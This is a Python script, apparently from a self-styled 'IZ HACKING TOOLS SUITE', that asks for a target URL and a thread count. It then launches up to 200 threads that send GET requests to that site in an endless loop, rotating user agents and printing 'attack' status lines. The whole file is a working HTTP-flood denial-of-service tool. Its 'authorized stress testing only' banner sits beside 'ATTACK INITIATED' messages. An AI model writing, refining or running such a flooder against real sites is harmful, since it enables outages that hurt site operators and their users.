
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading
import requests
import os
import sys
import time
import signal
import random

# --- CONFIGURACIÓN DE COLORES SANGRIENTOS ---
R = '\033[91m'  # Rojo Intenso (Ataque)
G = '\033[92m'  # Verde (Éxito)
W = '\033[0m'   # Blanco (Normal)
Y = '\033[93m'  # Amarillo (Carga)
CY = '\033[96m' # Cyan (Info)
D = '\033[2m'   # Dim (Contraste)

# --- USER AGENTS REALISTAS ---
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]

stats = {"sent": 0, "errors": 0}

def signal_handler(sig, frame):
    print(f"\n\n{Y}[-] ABRUPT TERMINATION BY USER. SUMMARY:{W}")
    print(f"{G}[+] Total Packets Sent: {stats['sent']}{W}")
    print(f"{R}[!] Connection Errors:  {stats['errors']}{W}")
    print(f"{Y}[*] MISSION COMPLETE.{W}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def brutal_banner():
    # --- LOGO CORREGIDO: IZ (CON LA Z CLARA) ---
    print(f"""
{R}
 ████  ███████      ██████   ██████   ██████   ██████  
░░███ ░░░░░███      ░░██████ ░░██████ ███████ ████████ 
 ░███     ███        ░███░███ ░███░███░███░░███░███░░░░  
 ░███    ███         ░███ ░███░███ ░███░███ ░███░███████ 
 ░███   ███          ░███ ░███░███ ░███░███ ░███░░░░░███ 
 ░███  ███           ░███ ███ ░███ ███ ░███████ ████████ 
 ████ ███████       ██████  ██████   ░░██████ ░███████  
░░░░ ░░░░░░░       ░░░░░░  ░░░░░░     ░░░░░░  ░░░░░░░   
                                                                            
    {D}-------------------------------------------------------------------{W}
    {CY}Lead Developer: IZ4CXZ_BY | Framework: IZ HACKING TOOLS SUITE v1.0{W}
    {R}Authorized Stress Testing Environment ONLY! Use Responsibly.{W}
    {D}-------------------------------------------------------------------{W}
    """)

def attack_thread(target_url, thread_id):
    headers = {'User-Agent': random.choice(user_agents)}
    while True:
        try:
            response = requests.get(target_url, headers=headers, timeout=5)
            if response.status_code == 200:
                print(f"{G}[T{thread_id:03}] SENT PACKET >>> {target_url} | HTTP/200 OK{W}")
            else:
                print(f"{Y}[T{thread_id:03}] SENT PACKET >>> {target_url} | HTTP/{response.status_code} WN{W}")
            stats["sent"] += 1
        except requests.exceptions.RequestException:
            print(f"{R}[T{thread_id:03}] CONNECTION REFUSED! Blocked/Target Down.{W}")
            stats["errors"] += 1

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    brutal_banner()
    
    target = input(f"{Y}Target URL (http/s): {W}").strip()
    if not target.startswith("http"):
        print(f"\n{R}[!] FATAL ERROR: Protocols HTTP:// or HTTPS:// required.{W}")
        return

    try:
        threads_count = int(input(f"{Y}Threads to deploy (10-200): {W}"))
    except ValueError:
        print(f"\n{R}[!] Error: Use numeric value.{W}")
        return

    print(f"\n{CY}[*] INITIALIZING SUITE... {W}")
    time.sleep(1)
    
    print(f"{R}[!] WARMING UP ENGINE...{W}")
    for i in range(3, 0, -1):
        print(f"{R}[!] DEPLOYMENT IN {i}...{W}")
        time.sleep(0.7)

    print(f"\n{R}[!!!] ALL HILOS DEPLOYED. ATTACK INITIATED ON {target} [!!!]{W}")
    print(f"{D}-------------------------------------------------------------------{W}\n")
    time.sleep(1)

    for i in range(threads_count):
        t = threading.Thread(target=attack_thread, args=(target, i))
        t.daemon = True
        t.start()

    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            signal_handler(signal.SIGINT, None)

if __name__ == "__main__":
    main()
